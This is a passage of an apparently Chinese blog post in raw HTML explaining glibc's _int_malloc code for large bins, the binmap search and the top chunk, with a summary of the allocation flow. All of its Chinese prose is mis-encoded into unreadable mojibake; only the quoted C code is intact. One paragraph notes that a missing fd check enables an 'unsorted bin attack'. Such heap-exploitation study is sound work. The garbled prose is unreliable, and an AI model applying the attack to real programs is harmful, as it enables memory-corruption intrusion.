<span class="hljs-comment">//å°†large chunkä» largebin ä¸­è§£é“¾</span><br>           unlink (av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-comment">//å¤„ç†åˆ‡åˆ†ä¸‹æ¥çš„å‰©ä½™éƒ¨åˆ†ï¼Œå¦‚æœåˆ‡å‰²ä¸‹æ¥çš„éƒ¨åˆ†å°äº MINSIZE é‚£å°±ä¸åˆ‡å‰²äº†</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>             &#123;<br>               <span class="hljs-comment">//æŠŠå®ƒç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªå¿«prev_inuseä½è®¾1</span><br>               set_inuse_bit_at_offset (victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                 victim-&gt;size |= NON_MAIN_ARENA;<br>             &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><br>             &#123;<br>               <span class="hljs-comment">//å°†åˆ‡å‰²çš„å‰©ä½™éƒ¨åˆ†æ’å…¥ unsortedbin ä¸­</span><br>               remainder = chunk_at_offset (victim, nb);<br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                  have to perform a complete insert here.  */</span><br>               bck = unsorted_chunks (av);<br>               fwd = bck-&gt;fd;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                 &#123;<br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>                 &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<br>               <span class="hljs-comment">// remainder ä¸æ»¡è¶³ small bin</span><br>               <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                 &#123;<br>                   <span class="hljs-comment">//æ¸…ç©ºå®ƒçš„fd_nextsizeå’Œbk_nextsize</span><br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                 &#125;<br>               <span class="hljs-comment">// è®¾ç½®åˆ†é…çš„ chunk å †å¤´</span><br>               set_head (victim, nb | PREV_INUSE |<br>                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head (remainder, remainder_size | PREV_INUSE);<br>               set_foot (remainder, remainder_size);<br>             &#125;<br>           check_malloced_chunk (av, victim, nb);<br>           <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>           alloc_perturb (p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>         &#125;<br>     &#125;<br></code></pre></td></tr></table></figure><p>åœ¨å¯»æ‰¾æ—¶ä¸æ˜¯æœ‰è¯´è¦æ‰¾æœ€å°èƒ½æ»¡è¶³çš„å¤§å°çš„å—å˜›ï¼Œä»£ç ä¸­ <code>nb</code> æ˜¯æŒ‡ç”¨æˆ·éœ€è¦çš„æœ€å°èƒ½æ»¡è¶³çš„å—çš„ <code>size</code> ï¼Œå®é™…ä¸Šå¹¶ä¸æ˜¯æ‰€æœ‰æƒ…å†µä¸‹éƒ½æ»¡è¶³ <code>size=nb</code> ã€‚ä¾‹å¦‚ï¼šæˆ‘ä»¬ç”³è¯· 0x1 å¤§å°çš„å †å—ï¼Œé‚£å°±åªèƒ½ç»™å®ƒä¸€ä¸ª 0x20 çš„ chunkã€‚æˆ–è€… æˆ‘ä»¬ç°åœ¨ç”šè‡³æ²¡æœ‰ 0x20 çš„å—ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ª 0x30 çš„ï¼Œé‚£ä¹ˆè¿™ä¸ª 0x30 çš„ chunk å°±æ˜¯æˆ‘ä»¬è¦å¯»æ‰¾çš„å †å—ã€‚</p><p>åœ¨å¤„ç†åˆ‡å‰²ä¸‹æ¥çš„å †å—æ—¶ï¼Œå®ƒåªæ£€æµ‹äº†äº† <code>unsorted bin-&gt;fd-&gt;bk</code> æ˜¯å¦ç­‰äºé‚£ä¸ª <code>unsorted bin</code> ï¼Œå¯¹äºå †å—æ¥è¯´å°±æ˜¯åªæ£€æµ‹äº† <code>bk</code> æŒ‡é’ˆã€‚è¿™æ˜¯ä¸€ä¸ªåˆ©ç”¨å°æŠ€å·§ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ—¶<strong>æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ <code>fd</code> æŒ‡é’ˆä¸ºæœŸæœ›çš„å€¼ï¼Œä¸ä¼šåœ¨è¿™é‡Œè¢«æ£€æµ‹åˆ°ï¼Œå°±æ˜¯ <code>unsorted bin attack</code> äº†ã€‚</strong></p><p>è¢«åˆ‡å‰²çš„å‰©ä¸‹ chunk ä¼šè¢«æ”¾åœ¨ <code>unsortedbin</code> ï¼Œä½†æ˜¯ç¨‹åºä»ç„¶ä¼šæ£€æµ‹å®ƒæ˜¯ä¸æ˜¯åœ¨ <code>small bin</code> çš„èŒƒå›´é‡Œã€‚å¦‚æœä¸åœ¨ <code>small bin</code> èŒƒå›´å†…ï¼Œå°±ä¼šæ¸…ç©ºå®ƒçš„ <code>fd_nextsize</code> å’Œ <code>bk_nextsize</code> ã€‚å› ä¸ºå®ƒè¦å›åˆ° <code>unsorted bin</code> ï¼Œè¿™ä¸¤ä¸ªå­—æ®µå°±æ²¡ä»€ä¹ˆç”¨äº†ï¼Œå°±ä¼šè¢«æ¸…ç©ºã€‚</p><p>å¦‚æœå½“å‰çš„ large bin ä¸­æ²¡æœ‰ç¬¦åˆè¦æ±‚çš„ chunkï¼Œåˆ™åœ¨å…¶å®ƒ size çš„ large bin ä¸­è¿›è¡ŒæŸ¥æ‰¾ã€‚é¦–å…ˆéœ€è¦çœ‹ä¸€ä¸‹è¿™ä¸ª  <code>binmap</code> ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">++idx;<br>   bin = bin_at (av, idx);<br>   block = idx2block (idx);<br>   <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<br>   bit = idx2bit (idx);<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç»“æ„ç”¨äºå¿«é€Ÿæ£€ç´¢ä¸€ä¸ª <code>bin</code> æ˜¯å¦ä¸ºç©ºï¼Œæ¯ä¸€ä¸ª <code>bit</code> è¡¨ç¤ºå¯¹åº”çš„ <code>bin</code> ä¸­æ˜¯å¦å­˜åœ¨ç©ºé—² chunk ã€‚è¿™ä¸€æ®µå°±æ˜¯è¯´ï¼Œå¦‚æœ <code>large bin</code> æœç´¢å®Œäº†éƒ½æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„ <code>chunk</code> ï¼Œé‚£ä¹ˆå°±å»ä¸‹ä¸€ä¸ª <code>idx</code> é‡Œé¢å¯»æ‰¾ã€‚ç„¶åä¸€å…±æœ‰4ä¸ª <code>int</code> ï¼Œæ¯ä¸ª <code>int</code> 32ä½è¡¨ç¤ºä¸€å— <code>map</code> ï¼Œä¸€å…±è¡¨ç¤º <code>128</code> ä½ã€‚</p><p>è¿™æ®µä»£ç çš„æ‰§è¡Œæµç¨‹å°±æ˜¯ï¼šåˆ©ç”¨ idx ç´¢å¼•å€¼æ¥è·å–æŒ‡å‘å¯¹åº” bin çš„æŒ‡é’ˆã€‚ç„¶åæ ¹æ®è¿™ä¸ª bin æŒ‡é’ˆæ¥è·å– </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;; )<br>     &#123;<br>       <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>       <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>         &#123;<br>           <span class="hljs-keyword">do</span><br>             &#123;<br>               <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                 <span class="hljs-keyword">goto</span> use_top;<br>             &#125;<br>           <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<br><br>           bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));<br>           bit = <span class="hljs-number">1</span>;<br>         &#125;<br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªåˆ¤æ–­æ¡ä»¶ï¼š</p><ul><li><code>bit&gt;map</code>ï¼šå¦‚æœè¿™ä¸ªä½çš„æƒå€¼éƒ½æ¯”å®ƒæ•´ä¸ªçš„ <code>map</code> éƒ½å¤§äº†ï¼Œè¯´æ˜ <code>map</code> ä¸Šé‚£ä¸ª <code>bit</code> çš„æƒå€¼å¿…å®šä¸º0</li><li><code>bit==0</code>ï¼šå¦‚æœè¿™ä¸ª <code>bit</code> éƒ½æ˜¯ 0 è¯´æ˜è¿™ä¸ª <code>index</code> ä¹Ÿä¸å¯¹ã€‚</li></ul><p>ä¸¤ä¸ªæ¡ä»¶åªè¦æ»¡è¶³å…¶ä¸€å°±æ˜¯æ²¡æœ‰ç©ºé—²å †å—ï¼Œæ¥ç€å»æŸ¥çœ‹ä¸‹ä¸€ä¸ª indexã€‚</p><p>æ¥ä¸‹æ¥çš„åˆ¤æ–­å¦‚æœ <code>map==0</code> ï¼Œè¯´æ˜è¿™æ•´ä¸ª <code>block</code> éƒ½æ²¡æœ‰ç©ºé—²å—ï¼Œå°±ç›´æ¥è·³è¿‡ï¼Œä¸ä¸º 0 åˆ™é€€å‡ºå»æ‰§è¡Œä¸‹é¢çš„æ“ä½œï¼Œå¦‚æœè¶…è¿‡äº† <code>block</code> çš„æ€»æ•°ï¼Œé‚£å°±è¯´æ˜ <code>unsorted bin</code> å’Œ <code>large bin</code> ä¸­ä¹Ÿæ²¡æœ‰åˆé€‚çš„<code>chunk</code>ï¼Œé‚£æˆ‘ä»¬å°±åˆ‡å‰²<code>top_chunk</code>äº†ï¼Œè¿™é‡Œç”¨äº†ä¸€ä¸ª <code>goto use_top;</code> è·³è½¬ï¼Œåœ¨åé¢ä¼šåˆ†æåˆ°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>      <span class="hljs-comment">// åœ¨ block ä¸­æ‰¾åˆ°å­˜åœ¨ç¬¦åˆè¦æ±‚çš„ large bin é“¾è¡¨å¤´æŒ‡é’ˆ</span><br>      <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<br>        &#123;<br>          bin = next_bin (bin);<br>          bit &lt;&lt;= <span class="hljs-number">1</span>;<br>          assert (bit != <span class="hljs-number">0</span>);<br>        &#125;<br><br>      <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>      victim = last (bin);<br><br>      <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br><span class="hljs-comment">// å¦‚æœé“¾è¡¨éç©º</span><br>      <span class="hljs-keyword">if</span> (victim == bin)<br>        &#123;<br>          av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><br>          bin = next_bin (bin);<br>          bit &lt;&lt;= <span class="hljs-number">1</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p>ç»è¿‡ä¸Šé¢çš„æµç¨‹ï¼Œæˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†åˆé€‚çš„ block ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾ block çš„å„ä¸ªä½äº†ã€‚ä»ä½ä½å¼€å§‹ï¼Œå¦‚æœæ£€æŸ¥åˆ°<code>map</code>é‚£ä¸€ä½å¯¹åº”ä¸º0å°±æ‰¾ä¸‹ä¸€ä½ï¼Œæˆ‘ä»¬å‰é¢æåˆ° bk ä¸º <code>large bin</code> çš„æœ€å°å—ï¼Œæ‰€ä»¥å…ˆä»å®ƒå¼€å§‹ï¼Œä¹Ÿå°±æ˜¯å…ˆæ‰§è¡Œ <code>bin = next_bin (bin);</code> ã€‚</p><p>å½“ç„¶ä¸èƒ½è¯´ <code>map</code> é‡Œé¢è¯´è¿™é‡Œæœ‰å®ƒå°±æœ‰ï¼Œæˆ‘è¿˜å¾—è‡ªå·±åˆ¤æ–­ä¸€ä¸‹è¿™ä¸ª<code>bin</code>é‡Œé¢æ˜¯ä¸æ˜¯çœŸçš„æœ‰ï¼Œå¦‚æœæ²¡æœ‰å°±è¦åŠæ—¶æŠŠæ ‡å¿—ä½æ¸…é™¤ç„¶å <code>bit&lt;&lt;1</code> å»å¯»æ‰¾ä¸‹ä¸€ä¸ª <code>index</code> ã€‚</p><p>æ‰¾åˆ°åˆé€‚çš„ <code>large bin</code> çš„ç´¢å¼•ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»ä¸­æ‰¾åˆé€‚çš„å †å—ï¼Œæµç¨‹å’Œä¸Šé¢ä¸€æ ·ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">// æ‰¾åˆ°ç¬¬ä¸€ä¸ªå¤§äºç”³è¯· size çš„ chunk è¿›è¡Œå †å—åˆ’åˆ†</span><br>       <span class="hljs-keyword">else</span><br>         &#123;<br>           size = chunksize (victim);<br><br>           <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>           assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb));<br><br>           remainder_size = size - nb;<br><br>           <span class="hljs-comment">/* unlink */</span><br>           unlink (av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>             &#123;<br>               set_inuse_bit_at_offset (victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                 victim-&gt;size |= NON_MAIN_ARENA;<br>             &#125;<br><br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><br>             &#123;<br>               remainder = chunk_at_offset (victim, nb);<br><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                  have to perform a complete insert here.  */</span><br>               bck = unsorted_chunks (av);<br>               fwd = bck-&gt;fd;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                 &#123;<br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>                 &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<br><br>               <span class="hljs-comment">/* advertise as last remainder */</span><br>               <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>                 av-&gt;last_remainder = remainder;<br>               <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                 &#123;<br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                 &#125;<br>               set_head (victim, nb | PREV_INUSE |<br>                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head (remainder, remainder_size | PREV_INUSE);<br>               set_foot (remainder, remainder_size);<br>             &#125;<br>           check_malloced_chunk (av, victim, nb);<br>           <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>           alloc_perturb (p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>         &#125;<br>     &#125;<br></code></pre></td></tr></table></figure><h5 id="Topchunk"><a href="#Topchunk" class="headerlink" title="Topchunk"></a>Topchunk</h5><p>å¦‚æœåœ¨ large bin ä¸­æ²¡æœ‰æ‰¾åˆ°å“åº”çš„ chunkï¼Œåˆ™éœ€è¦åœ¨ top chunk ä¸­æŸ¥æ‰¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">use_top:<br><br>  <span class="hljs-comment">//ä» av-&gt;top æ‹¿åˆ° top_chunk çš„åœ°å€</span><br>      victim = av-&gt;top;<br>  <span class="hljs-comment">//åˆ¤æ–­å¤§å°</span><br>      size = chunksize (victim);<br>  <span class="hljs-comment">//å¦‚æœå¤§å°ç¬¦åˆåˆ‡å‰²è¦æ±‚ï¼Œå°±æŒ‰ç…§ä¹‹å‰çš„æµç¨‹åˆ‡å‰²å¹¶æŠŠ chunk è¿”å›ç”¨æˆ·</span><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>        &#123;<br>          remainder_size = size - nb;<br>          remainder = chunk_at_offset (victim, nb);<br>          av-&gt;top = remainder;<br>          set_head (victim, nb | PREV_INUSE |<br>                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>          set_head (remainder, remainder_size | PREV_INUSE);<br><br>          check_malloced_chunk (av, victim, nb);<br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br><br>      <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">         here for all block sizes.  */</span><br>  <span class="hljs-comment">//å¦‚æœå¤§å°ä¸æ»¡è¶³éœ€è¦ï¼Œå°±å…ˆåˆå¹¶æ‰€æœ‰çš„ fastbinï¼Œæ¥ç€æ‰§è¡Œä¹‹å‰çš„å¾ªç¯</span><br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>        &#123;<br>          malloc_consolidate (av);<br>          <span class="hljs-comment">/* restore original bin index */</span><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>            idx = smallbin_index (nb);<br>          <span class="hljs-keyword">else</span><br>            idx = largebin_index (nb);<br>        &#125;<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">       */</span><br>  <span class="hljs-comment">//è°ƒç”¨ sysmalloc å»åˆ†é…æ–°ä¸€é¡µå†…å­˜</span><br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>          <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„ç¨‹åºä¼šåå¤æŸ¥æ‰¾å½“å‰å†…å­˜åŒºåŸŸæ˜¯å¦æœ‰åˆé€‚çš„å†…å­˜ï¼Œå¦‚æœå®åœ¨æ²¡æœ‰æ‰ä¼šå»è°ƒç”¨ <code>sysmalloc</code>ã€‚ä¸€æ¬¡è¿˜æ˜¯åˆ†é…<code>0x21000</code> çš„ chunk ä½œä¸ºæ–°çš„ <code>top_chunk</code> ï¼ŒåŸæ¥çš„ <code>top_chunk</code> å°†ä¼šè¢« <code>free</code> ã€‚</p><p>å¦‚æœæˆ‘ä»¬æ²¡æœ‰æ”¹è¿‡ <code>top_chunk</code> çš„ <code>size </code>ï¼Œé‚£ä¹ˆæ–°çš„å’Œæ—§çš„ <code>top_chunk </code>å°†ä¼šæ˜¯ç‰©ç†ç›¸é‚»ï¼Œå¦‚æœ <code>free</code> çš„<code>top_chunk </code>ä¸åœ¨ <code>fast bin</code> èŒƒå›´å†…ï¼Œé‚£å°±ä¼šå’Œæ–°çš„ <code>top_chunk</code> å‘ç”Ÿåˆå¹¶ã€‚</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p><code>malloc()</code>  å‡½æ•°è¢«è°ƒç”¨æ—¶ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>æ£€æŸ¥æ˜¯å¦è®¾ç½®äº† <code>malloc_hook</code> ï¼Œè‹¥è®¾ç½®äº†åˆ™è·³è½¬è¿›å…¥ <code>malloc_hook</code>ï¼Œè‹¥æœªè®¾ç½®åˆ™è·å–å½“å‰çš„åˆ†é…åŒºï¼Œè¿›å…¥<code>int_malloc()</code> ã€‚</li><li>å¦‚æœå½“å‰çš„åˆ†é…åŒºä¸ºç©ºï¼Œåˆ™è°ƒç”¨ <code>sysmalloc</code> åˆ†é…ç©ºé—´ï¼Œè¿”å›æŒ‡å‘æ–° <code>chunk</code> çš„æŒ‡é’ˆï¼Œå¦åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ã€‚</li><li>è‹¥ç”¨æˆ·ç”³è¯·çš„å¤§å°åœ¨ <code>fast bin</code> çš„èŒƒå›´å†…ï¼Œåˆ™è€ƒè™‘å¯»æ‰¾å¯¹åº” <code>size</code> çš„ fastbin chunk ï¼Œå¦‚æœè¿™ä¸ªå¯¹åº” <code>size</code> çš„ fastbin ä¸­æœ‰æ»¡è¶³çš„å †å—å°±è¿”å›ç»™ç”¨æˆ·ï¼Œå¦‚æœæ²¡æœ‰å°±è¿›å…¥ä¸‹ä¸€æ­¥ã€‚</li><li>å¦‚æœç”¨æˆ·ç”³è¯·çš„ <code>size</code> ç¬¦åˆ <code>small bin</code> çš„èŒƒå›´ï¼Œåˆ™åœ¨ç›¸åº”å¤§å°çš„é“¾è¡¨ä¸­å¯»æ‰¾ <code>chunk</code> ã€‚è‹¥ <code>small bin</code> æœªåˆå§‹åŒ–ï¼Œåˆ™è°ƒç”¨ <code>malloc_consolidate</code> åˆå§‹åŒ–åˆ†é…å™¨ï¼Œç„¶åç»§ç»­ä¸‹é¢çš„æ­¥éª¤ï¼›å¦‚æœå·²ç»åˆå§‹åŒ–äº†ï¼Œå°±å¯»æ‰¾å¯¹åº”çš„ <code>small bin</code> çš„é“¾è¡¨ï¼Œå¦‚æœè¯¥ <code>size</code>  çš„ <code>small bin</code> åˆæ»¡è¶³çš„å †å—å°±å–å‡ºè¿”å›ï¼Œå¦åˆ™ç»§ç»­ä¸‹é¢çš„æ­¥éª¤ã€‚å¦‚æœç”³è¯·çš„ä¸åœ¨ <code>small bin</code> çš„èŒƒå›´ï¼Œé‚£ä¹ˆè°ƒç”¨ <code>malloc_consolidate</code> å‡½æ•°å»åˆå¹¶æ‰€æœ‰ fastbin å¹¶è¿›å…¥ä¸‹ä¸€æ­¥ã€‚</li><li>å¦‚æœåœ¨ä¸Šé¢çš„æµç¨‹ä¸­éƒ½æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„å—ï¼Œä¼šéå† fast bins ä¸­çš„ chunkï¼Œå°†ç›¸é‚»çš„ chunk è¿›è¡Œåˆå¹¶ï¼Œ å¹¶é“¾æ¥åˆ° unsorted bin ä¸­ã€‚</li><li>å¦‚æœç”¨æˆ·ç”³è¯·çš„å¤§å°ç¬¦åˆ <code>large bin</code> æˆ– <code>small bin</code> é“¾è¡¨ä¸ºç©ºï¼Œå®Œæˆäº†ä¸Šä¸€æ­¥ä¹‹åï¼Œå°±ä¼šå¼€å§‹éå†å¤„ç† <code>unsorted bin</code> é“¾è¡¨ä¸­çš„ chunk ã€‚å¦‚æœ <code>unsorted bin</code> åª æœ‰ä¸€ä¸ª chunkï¼Œè¿™ä¸ª chunk åœ¨ä¸Šæ¬¡åˆ†é…æ—¶è¢«ä½¿ç”¨è¿‡ï¼Œä¸”æ‰€éœ€åˆ†é…çš„ chunk å¤§ å°å±äº <code>small bin</code>ï¼ŒåŒæ—¶è¿™ä¸ª chunk çš„ <code>size</code> å¤§äºç­‰äºéœ€è¦åˆ†é…çš„å¤§å°ã€‚è¿™ç§æƒ…å†µä¸‹å°±ç›´æ¥å°†è¯¥ chunk è¿›è¡Œåˆ‡å‰²ï¼›å¦åˆ™å°†æ ¹æ® chunk çš„ç©ºé—´å¤§å°å°†å…¶æ”¾å…¥ small  bins æˆ–æ˜¯ large bins ä¸­ï¼Œéå†å®Œæˆåï¼Œè½¬å…¥ä¸‹ä¸€æ­¥ã€‚</li><li>ä¸Šé¢çš„æ­¥éª¤æ‰§è¡Œç»“æŸè¿˜æ²¡æœ‰æ‰¾åˆ°å †å—ï¼Œå°±è¯´æ˜éœ€è¦åˆ†é…çš„æ˜¯ä¸€å—å¤§çš„å†…å­˜ï¼Œæˆ–è€… <code>small bin</code> å’Œ <code>unsorted bin</code> ä¸­éƒ½æ‰¾ä¸åˆ°åˆé€‚çš„ chunkï¼Œå¹¶ä¸” <code>fast bin</code> å’Œ <code>unsorted bin</code> ä¸­æ‰€æœ‰çš„ chunk éƒ½æ¸…é™¤å¹²å‡€äº†ã€‚ç¨‹åºå°±æ¥æ—¶ä» <code>large bins</code> ä¸­æŒ‰ç…§ â€œsmallest-firstï¼Œbest-fitâ€ çš„åŸåˆ™ï¼Œæ‰¾ä¸€ä¸ªåˆé€‚çš„ chunkï¼Œä»ä¸­åˆ’åˆ†ä¸€å—æ‰€éœ€å¤§å°çš„ chunkï¼Œå¹¶å°†å‰©ä¸‹çš„éƒ¨åˆ†é“¾æ¥å›åˆ° bins ä¸­ã€‚è‹¥æ“ä½œæˆåŠŸï¼Œåˆ™åˆ†é…ç»“æŸï¼Œå¦åˆ™è½¬åˆ°ä¸‹ä¸€æ­¥ã€‚</li><li>æ ¹æ® <code>binmap</code> æ‰¾åˆ°è¡¨ç¤ºæ›´å¤§ <code>size</code> çš„ <code>large bin</code> é“¾è¡¨ï¼Œè‹¥å…¶ä¸­å­˜åœ¨ç©ºé—²çš„ chunk ï¼Œåˆ™å°† chunk æ‹†åˆ†ä¹‹åè¿”å›ç¬¦åˆè¦æ±‚çš„éƒ¨åˆ†ï¼Œå¹¶æ›´æ–° <code>last_remainder</code>ã€‚å¦‚æœæ²¡æœ‰åˆé€‚çš„å †å—å°±è¿›å…¥ä¸‹ä¸€æ­¥å» <code>top chunk</code> 